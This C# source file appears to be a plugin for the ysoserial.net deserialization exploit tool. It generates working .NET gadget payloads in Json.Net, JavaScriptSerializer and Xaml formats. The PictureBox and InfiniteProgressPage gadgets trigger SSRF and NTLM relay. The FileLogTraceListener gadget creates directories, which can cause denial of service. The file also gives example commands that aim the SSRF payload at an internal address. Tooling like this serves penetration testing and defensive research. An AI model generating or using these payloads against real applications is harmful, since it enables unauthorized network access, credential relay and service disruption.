using System;
using System.Collections.Generic;
using NDesk.Options;
using ysoserial.Helpers;

namespace ysoserial.Plugins
{
    // Author: Piotr Bazydlo
    // Implements Non-RCE gadgets for .NET Framework.
    // Gadgets are implemented for several serializers but some of serializers are not implemented (like MessagePack)
    // Feel free to add any gadget here or contribute with the implementations for different serializers

    public class NetNonRceGadgetsPlugin : IPlugin
    {
        private static string input = "";
        private static string gadget = "";
        private static string formatter = "";
        private static bool showList;
        private static bool test;
        private static bool minify;
        private static readonly OptionSet options = new OptionSet
        {
            {
                "l", "prints list of implemented gadgets", v =>
                {
                    if (v != null) showList = true;
                }
            },
            {"i|input=", "input to the gadget", v => input = v},
            {"g|gadget=", "gadget to use", v => gadget = v},
            {"f|formatter=", "Formatter to use", v => formatter = v},
            {
                "t", "test gadget (execute after generation)", v =>
                {
                    if (v != null) test = true;
                }
            },
            {
                "minify", "minify gadget", v =>
                {
                    if (v != null) minify = true;
                }
            }
        };

        public string Name()
        {
            return "NetNonRceGadgets";
        }

        public string Description()
        {
            return "Implements Non-RCE gadgets for .NET Framework";
        }
        public string Credit()
        {
            return "Piotr Bazydlo";
        }
        public OptionSet Options()
        {
            return options;
        }

        public string GadgetsList()
        {
            return @"
Gadgets:

    (*) PictureBox - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
        Formatters: Json.Net, JavaScriptSerializer, Xaml
        [Finders: Piotr Bazydlo]

    (*) InfiniteProgressPage - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
        Formatters: Json.Net, JavaScriptSerializer, Xaml
        [Finders: Piotr Bazydlo]

    (*) FileLogTraceListener - directory creation gadget.May lead to DoS, when executed with admin privileges.
        Formatters: Json.Net, JavaScriptSerializer, Xaml
        [Finders: Piotr Bazydlo]

Exemplary usage: 

    ysoserial.exe -p NetNonRceGadgets -l

    ysoserial.exe -p NetNonRceGadgets -g PictureBox -f Json.Net -i ""http://192.168.1.100/ssrf""

    ysoserial.exe -p NetNonRceGadgets -g FileLogTraceListener -f JavaScriptSerializer -i 'C:\\Users\\Public\\pocdir' -t
";
        }

        //PictureBox gadget
        public string PictureBox(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "javascriptserializer")
            {
                gadget = @"
{
    '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "xaml")
            {
                gadget = @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + input + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</PictureBox>
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }


            return gadget;
        }

        //InfiniteProgressPage gadget
        public string InfiniteProgressPage(string input, string formatter)
        {

            String gadget = "";
            
            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "javascriptserializer")
            {
                gadget = @"
{
    '__type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "xaml")
            {
                gadget = @"
<InfiniteProgressPage AnimatedPictureFile=""" + input + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</InfiniteProgressPage>
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the InfiniteProgressPage gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //FileLogTraceListener gadget
        public string FileLogTraceListener(string input, string formatter)
        {
            String gadget = "";
            
            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "javascriptserializer")
            {
                gadget = @"
{
    '__type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + input + @"'
}";
            }
            else if (formatter.ToLower() == "xaml")
            {
                gadget = @"
<FileLogTraceListener CustomLocation=""" + input + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</FileLogTraceListener>";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the FileLogTraceListener gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        public object Run(string[] args)
        {

            List<string> extra = options.Parse(args);

            //Print list of gadgets
            if (showList)
            {
                return GadgetsList();
            }

            //inputs verification
            try
            {
                if (string.IsNullOrWhiteSpace(gadget)) throw new ArgumentException("A gadget name must be provided.");

                if (string.IsNullOrWhiteSpace(formatter)) throw new ArgumentException("A formatter name must be provided.");

                if (string.IsNullOrWhiteSpace(input)) throw new ArgumentException("An input to the gadget must be provided.");
            }
            catch (Exception e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " -l' for the list of implemented gadgets and formatters.");
                Environment.Exit(-1);
            }


            //gadgets generation
            String payload = "";

            if (gadget.ToLower() == "picturebox")
            {
                payload = PictureBox(input, formatter);
            }
            else if (gadget.ToLower() == "infiniteprogresspage")
            {
                payload = InfiniteProgressPage(input, formatter);
            }
            else if (gadget.ToLower() == "filelogtracelistener")
            {
                payload = FileLogTraceListener(input, formatter);
            }
            else
            {
                Console.WriteLine("Gadget " + gadget + " does not exist! Use -l option to show available gadgets");
                Environment.Exit(-1);
            }

            //minify
            if (minify)
            {
                if (formatter.ToLower() == "json.net" || formatter.ToLower() == "javascriptserializer")
                {
                    payload = JsonHelper.Minify(payload, null, null);
                }
            }

            //tests
            if (test)
            {
                if (formatter.ToLower() == "json.net")
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
                else if (formatter.ToLower() == "javascriptserializer")
                {
                    try
                    {
                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
                else if (formatter.ToLower() == "xaml")
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
            }

            return payload;
        }
    }
}